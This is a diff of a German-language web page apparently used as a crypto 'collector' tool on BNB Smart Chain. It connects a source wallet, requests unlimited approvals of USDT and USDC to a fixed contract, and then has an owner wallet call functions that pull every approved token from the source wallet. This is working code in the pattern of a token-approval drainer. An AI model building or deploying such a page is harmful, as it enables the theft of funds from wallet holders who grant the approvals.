@@ -3,136 +3,130 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
-  <title>Admin Collector Panel</title>
+  <title>Admin Multi-Collector</title>
   <style>
     body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
-    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:380px; box-shadow:0 10px 30px rgba(0,0,0,.5); border: 1px solid #1e293b; }
-    h2{ margin-top:0; color: #f8fafc; font-size: 20px; text-align: center; margin-bottom: 20px; }
+    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
+    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
     .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
     .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
-    button { background:#22c55e; border:none; padding:14px; width:100%; font-size:15px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; -webkit-tap-highlight-color: transparent; }
+    button { background:#22c55e; border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
     button:active { transform: scale(0.98); opacity: 0.8; }
-    button.secondary { background:#334155; margin-bottom: 10px; }
-    button.danger { background: #ef4444; margin-top: 10px; }
-    .mono { font-family: monospace; font-size:11px; word-break:break-all; background: #000; padding: 10px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
-    #status { margin-top:15px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 13px; text-align: center; min-height: 45px; border: 1px dashed #334155; line-height: 1.4; color: #cbd5e1; }
-    .info-footer { font-size: 10px; color: #64748b; margin-top: 15px; text-align: center; line-height: 1.5; }
+    button.secondary { background:#334155; }
+    button.danger { background: #ef4444; margin-top: 5px; }
+    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
+    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; line-height: 1.4; }
+    .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
   </style>
 </head>
 <body>
 
 <div class="box">
-  <h2>Admin Collector Panel</h2>
+  <h2>Multi-Token Collector</h2>
 
   <div class="step">
-    <span class="step-title">Phase 1: Wallet A (Quelle)</span>
-    <button class="secondary" onclick="connectAndSwitch()">1. Wallet A verbinden</button>
+    <span class="step-title">1. Verbindung (Wallet A)</span>
+    <button class="secondary" onclick="connectAndSwitch()">Wallet A verbinden</button>
     <div class="mono" id="addr">Nicht verbunden</div>
-    
-    <button style="margin-top:12px" onclick="approveUSDT()">2. USDT Freigabe (Approve)</button>
   </div>
 
-  <div class="step" style="border-left-color: #eab308;">
-    <span class="step-title">Phase 2: Owner (Du)</span>
-    <p style="font-size:11px; color:#cbd5e1; margin-bottom:10px;">Jetzt in der Wallet zur <b>Owner-Adresse</b> wechseln!</p>
-    <button class="danger" onclick="collectAll()">3. USDT komplett ziehen</button>
+  <div class="step" style="border-left-color: #10b981;">
+    <span class="step-title">2. Freigaben (Quelle)</span>
+    <div class="token-grid">
+      <button id="btnUSDT" onclick="approveToken('USDT')">Approve USDT</button>
+      <button id="btnUSDC" onclick="approveToken('USDC')">Approve USDC</button>
+    </div>
+    <p style="font-size: 10px; color: #94a3b8; text-align: center; margin: 5px 0 0 0;">Jedes Token einzeln bestätigen!</p>
+  </div>
+
+  <div class="step" style="border-left-color: #ef4444;">
+    <span class="step-title">3. Einzug (Owner-Wallet)</span>
+    <p style="font-size:10px; color:#cbd5e1; margin-bottom:8px; text-align:center;">Jetzt zu <b>Owner-Wallet</b> wechseln!</p>
+    <button class="danger" onclick="collectAll('USDT')">Ziehe USDT</button>
+    <button class="danger" onclick="collectAll('USDC')">Ziehe USDC</button>
   </div>
 
   <div id="status">Bereit. Bitte Schritt 1 starten.</div>
-
-  <div class="info-footer">
-    Ziel-Netzwerk: <b>BNB Smart Chain (BSC)</b><br>
-    Contract: 0x61bF4DAE189C62344Df1E9802B5338C196d1E26B
-  </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
 <script>
-  const COLLECTOR_ADDRESS = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
-  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-  const BSC_CHAIN_ID = "0x38"; // 56 in Hex
+  const CONTRACT = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
+  const TOKENS = {
+    USDT: "0x55d398326f99059fF775485246999027B3197955",
+    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
+  };
+  const BSC_ID = "0x38";
 
   let walletA = null;
-
-  function setStatus(msg) { document.getElementById("status").innerHTML = msg; }
+  function setStatus(m) { document.getElementById("status").innerHTML = m; }
 
   async function connectAndSwitch() {
     try {
-      if (!window.ethereum) return setStatus("❌ Kein Wallet-Browser gefunden. Bitte Trust Wallet nutzen.");
-      
-      setStatus("⌛ Verbindung wird angefragt...");
-      
-      // 1. Account anfragen
+      if (!window.ethereum) return setStatus("❌ Bitte Trust Wallet nutzen.");
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       walletA = accounts[0];
       document.getElementById("addr").innerText = walletA;
 
-      // 2. Automatischer Netzwerkcheck & Wechsel zu BSC
       try {
         await window.ethereum.request({
           method: 'wallet_switchEthereumChain',
-          params: [{ chainId: BSC_CHAIN_ID }],
+          params: [{ chainId: BSC_ID }],
         });
-        setStatus("✅ Verbunden & Netz auf BSC gewechselt.<br>Jetzt Schritt 2: Freigabe.");
-      } catch (switchError) {
-        // Falls BSC noch nicht in der Liste ist (Code 4902)
-        if (switchError.code === 4902) {
+      } catch (e) {
+        if (e.code === 4902) {
           await window.ethereum.request({
             method: 'wallet_addEthereumChain',
             params: [{
-              chainId: BSC_CHAIN_ID,
+              chainId: BSC_ID,
               chainName: 'BNB Smart Chain',
               nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
               rpcUrls: ['https://bsc-dataseed.binance.org/'],
               blockExplorerUrls: ['https://bscscan.com/']
             }]
           });
-        } else {
-          throw switchError;
         }
       }
-    } catch (e) {
+      setStatus("✅ Verbunden auf BSC.<br>Führe nun die Freigaben aus.");
+    } catch (e) { setStatus("❌ Verbindung abgelehnt."); }
+  }
+
+  async function approveToken(type) {
+    try {
+      if(!walletA) return setStatus("❌ Erst Schritt 1 ausführen!");
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      const abi = ["function approve(address s, uint256 a) public returns (bool)"];
+      const contract = new ethers.Contract(TOKENS[type], abi, signer);
+      
+      setStatus(`⌛ Bestätige ${type} Freigabe in deiner App...`);
+      const tx = await contract.approve(CONTRACT, ethers.MaxUint256, { gasLimit: 80000 });
+      await tx.wait();
+      
+      setStatus(`✅ ${type} freigegeben!`);
+      document.getElementById("btn" + type).style.background = "#1e293b";
+      document.getElementById("btn" + type).innerText = type + " OK";
+    } catch (e) { 
       console.error(e);
-      setStatus("❌ Abbruch: " + (e.message.includes("4001") ? "Verbindung abgelehnt." : e.message));
+      setStatus(`❌ Fehler bei ${type}. (BNB vorhanden?)`); 
     }
   }
 
-  async function approveUSDT() {
+  async function collectAll(type) {
     try {
-      if (!walletA) return setStatus("❌ Zuerst Schritt 1 ausführen!");
+      if(!walletA) return setStatus("❌ Keine Wallet A Adresse.");
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
+      const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
+      const abi = [`function ${funcName}(address f) external`];
+      const contract = new ethers.Contract(CONTRACT, abi, signer);
       
-      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-      const contract = new ethers.Contract(USDT_ADDRESS, abi, signer);
-      
-      setStatus("⌛ Bitte Freigabe in der Wallet bestätigen...");
-      const tx = await contract.approve(COLLECTOR_ADDRESS, ethers.MaxUint256);
-      
-      setStatus("⌛ Transaktion wird verarbeitet...");
+      setStatus(`⌛ Einzug von ${type} läuft...`);
+      const tx = await contract[funcName](walletA);
       await tx.wait();
-      setStatus("✅ Freigabe erfolgreich!<br><b>Wechsle jetzt zur Owner-Wallet.</b>");
-    } catch (e) {
-      setStatus("❌ Fehler bei Freigabe (BNB für Gas vorhanden?)");
-    }
-  }
-
-  async function collectAll() {
-    try {
-      if (!walletA) return setStatus("❌ Wallet A Adresse fehlt.");
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      
-      const abi = ["function collectUSDTAll(address from) external"];
-      const contract = new ethers.Contract(COLLECTOR_ADDRESS, abi, signer);
-      
-      setStatus("⌛ Einzug wird gestartet...");
-      const tx = await contract.collectUSDTAll(walletA);
-      await tx.wait();
-      
-      setStatus("🎉 <b>ERFOLG!</b><br>USDT wurden in den Tresor verschoben.");
-    } catch (e) {
-      setStatus("❌ Fehler: Nur der Owner kann dies ausführen oder Wallet nicht gewechselt.");
+      setStatus(`🎉 Alle ${type} erfolgreich eingezogen!`);
+    } catch (e) { 
+      setStatus("❌ Nur Owner erlaubt oder Wallet nicht gewechselt."); 
     }
   }
 </script>
